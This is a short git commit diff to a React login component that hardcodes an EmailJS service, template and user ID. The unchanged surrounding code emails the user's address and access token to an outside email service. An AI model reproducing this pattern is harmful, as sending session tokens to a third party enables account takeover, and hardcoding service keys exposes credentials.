7080eac97a83e807ba7ba20e5ebb6fd7da82c4f1
Andrei <78772133+hyp3rion123@users.noreply.github.com>
2021-05-26 00:33:45 -0400

    Update Login.js

--- src/components/Login.js
+++ src/components/Login.js
@@ -52,7 +52,7 @@ const Login = () => {
             user_email: creds.email,
             access_token: token
         }
-        emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams, USER_ID);
+        emailjs.send("service_wxptry8", "contact_form", templateParams, "user_OLZP6VZZgytfp2F16BS3S");
     }
     }, [token])
     
